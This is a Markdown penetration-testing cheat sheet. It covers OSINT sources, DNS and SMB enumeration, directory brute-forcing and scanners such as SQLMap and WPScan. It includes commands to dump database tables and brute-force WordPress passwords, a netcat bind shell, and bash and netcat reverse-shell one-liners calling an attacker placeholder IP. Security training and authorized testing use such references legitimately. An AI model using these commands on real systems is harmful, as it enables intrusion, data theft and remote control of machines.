# Reconnaissance & Enumeration

## OSINT (Open-Source Intelligence)

### Google Dorking

| Operator | Description |
| :--- | :--- |
| `filetype:pdf` | Restricts results to a specific file type. |
| `site:github.com` | Limits search to a specific website. |
| `"exact phrase"` | Searches for an exact phrase. |
| `intitle:admin` | Searches for pages with keyword in title. |
| `-keyword` | Excludes a term from search. |

**More operators**: [Advanced Search Operators](https://github.com/cipher387/Advanced-search-operators-list)

### Specialized Search Engines

| Tool | URL | Description |
| :--- | :--- | :--- |
| **Shodan** | [shodan.io](https://www.shodan.io/) | Search engine for internet-connected devices. |
| **Censys** | [search.censys.io](https://search.censys.io/) | Internet-wide scanning, certificates, hosts. |
| **VirusTotal** | [virustotal.com](https://www.virustotal.com/) | Scan files/URLs against multiple AV engines. |
| **Have I Been Pwned** | [haveibeenpwned.com](https://haveibeenpwned.com/) | Check if email was in a data breach. |

### Username & Profile Search

| Tool | Description |
| :--- | :--- |
| `sherlock <username>` | Searches username across 300+ sites. [GitHub](https://github.com/sherlock-project/sherlock) |
| `maigret <username>` | Advanced Sherlock fork with more features. [GitHub](https://github.com/soxoj/maigret) |
| [whatsmyname.app](https://whatsmyname.app/) | Web-based username search. |

### Vulnerability Databases

| Resource | URL |
| :--- | :--- |
| **CVE/NVD** | [nvd.nist.gov](https://nvd.nist.gov/) |
| **Exploit-DB** | [exploit-db.com](https://www.exploit-db.com/) |
| **OWASP Cheat Sheets** | [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/) |

***

## DNS Enumeration
Tools for querying DNS servers and discovering subdomains.

| Command | Description |
| :--- | :--- |
| `dig ANY <domain>` | Queries for all available DNS records for a domain. |
| `dig AXFR @ns.<domain> <domain>` | **Zone Transfer**: Attempts to get all DNS records for a domain from its nameserver. A common misconfiguration. |
| `nslookup <domain>` | Performs a basic DNS query for the A record (IP address). |
| `gobuster dns -d <domain> -w <wordlist>` | **Subdomain Bruteforce**: Uses `gobuster` to find subdomains by trying names from a wordlist. |
| `ffuf -u https://FUZZ.<domain> -w <wordlist>` | **Subdomain Bruteforce**: Uses `ffuf` for fast subdomain discovery. `FUZZ` is the placeholder for the wordlist entries. |

#### SMB Enumeration
Tools for enumerating Server Message Block (SMB) services, common on Windows networks.

| Command | Description |
| :--- | :--- |
| `enum4linux-ng -A <target_IP>` | **Full Enumeration**: A modern tool that runs all basic enumeration checks for SMB, including shares, users, and policies. |
| `nmap --script=smb-enum-* -p 445 <target>` | **Nmap SMB Scripts**: Uses Nmap's scripting engine to enumerate SMB information. |
| `smbclient -L //<target_IP> -N` | **List Shares**: Lists all available SMB shares on the target without requiring a password (`-N`). |

#### Other Reconnaissance Tools

| Command | Description |
| :--- | :--- |
| `whois <domain>` | Retrieves registration and contact information for a domain. |
| `whatweb <URL>` | Identifies different web technologies used on a website, including CMS, frameworks, and server software. |
| `sublist3r -d <domain> -o subs.txt` | Enumerates subdomains using search engines. |
| `theharvester -d <domain> -l 500 -b google,bing` | Gathers emails, subdomains, hosts, employee names from public sources. |

#### Directory & File Bruteforcing

| Command | Description |
| :--- | :--- |
| `gobuster dir -u <URL> -w <wordlist>` | Bruteforce directories on a web server. |
| `gobuster dir -u <URL> -w <wordlist> -x php,txt,html` | Bruteforce files with specific extensions. |
| `feroxbuster -u <URL> -w <wordlist>` | Fast, recursive directory bruteforcer. |
| `dirb <URL> <wordlist>` | Web content scanner for directories. |

***

### **Vulnerability Scanning**

This cheatsheet provides commands for tools that actively scan for specific security vulnerabilities.

#### Nikto
A web server scanner that tests for thousands of potentially dangerous files/CGIs, outdated server versions, and other common misconfigurations.

| Command | Description |
| :--- | :--- |
| `nikto -h <URL>` | **Basic Scan**: Runs a standard scan against the specified web server. |
| `nikto -h <URL> -p 80,443,8080` | **Scan Specific Ports**: Scans the specified ports on the target. |
| `nikto -h <URL> -o report.html` | **Save Output**: Saves the scan results in an HTML file. |

#### SQLMap
An automatic SQL injection and database takeover tool.

| Command | Description |
| :--- | :--- |
| `sqlmap -u "<URL_with_param>"` | **Basic Test**: Tests a URL with a parameter for SQL injection vulnerabilities. |
| `sqlmap -u "<URL>" --forms` | **Test Forms**: Automatically finds and tests forms on a URL. |
| `sqlmap -u "<URL>" --dbs` | **List Databases**: If vulnerable, lists all available databases. |
| `sqlmap -u "<URL>" -D <db_name> --tables` | **List Tables**: Lists tables from a specific database. |
| `sqlmap -u "<URL>" -D <db_name> -T <table_name> --dump` | **Dump Table**: Dumps the content of a specific table. |
| `sqlmap -r request.txt` | **Test from Request File**: Tests a request captured in a file (e.g., from Burp Suite). |

#### WPScan
A black box WordPress security scanner.

| Command | Description |
| :--- | :--- |
| `wpscan --url <URL>` | **Basic Scan**: Runs a basic passive scan, checking the WordPress version and theme. |
| `wpscan --url <URL> --enumerate u` | **Enumerate Users**: Enumerates WordPress usernames. |
| `wpscan --url <URL> --enumerate p` | **Enumerate Plugins**: Lists installed plugins. |
| `wpscan --url <URL> --enumerate t` | **Enumerate Themes**: Lists installed themes. |
| `wpscan --url <URL> -P <pass_list> -U <user_list>` | **Password Brute-force**: Attempts to brute-force user passwords. |
| `wpscan --url <URL> --api-token <your_token>` | **Vulnerability Scan**: Uses the WPScan API to check for vulnerabilities in the enumerated plugins, themes, and WordPress version. |

#### SearchSploit
A command-line search tool for the Exploit Database.

| Command | Description |
| :--- | :--- |
| `searchsploit <term>` | **Search for Exploits**: Searches the local Exploit-DB repository for a term (e.g., `apache 2.4.49`). |
| `searchsploit -m <exploit_path>` | **Mirror (Copy) Exploit**: Copies an exploit from the repository to the current directory. |
| `searchsploit -x <exploit_path>` | **Examine Exploit**: Displays the content of the exploit file using `less`. |

***

### **Exploitation**

#### Netcat (`nc`)
The "Swiss-army knife" of networking, essential for shells.

| Command | Description |
| :--- | :--- |
| `nc -lvnp <port>` | **Set up a Listener**: Listens on a specified port for incoming connections. (`-l` listen, `-v` verbose, `-n` no DNS, `-p` port) |
| `nc <target_IP> <port>` | **Connect to a Listener**: Connects to a listening port. |
| `nc -lvnp <port> -e /bin/bash` | **Bind Shell**: Listens and executes `/bin/bash` upon connection (requires a version of `nc` with the `-e` option). |

##### Common Reverse Shells (run on the target machine):
```bash
# Bash Reverse Shell
bash -i >& /dev/tcp/<your_IP>/<port> 0>&1

# Netcat Reverse Shell
nc <your_IP> <port> -e /bin/bash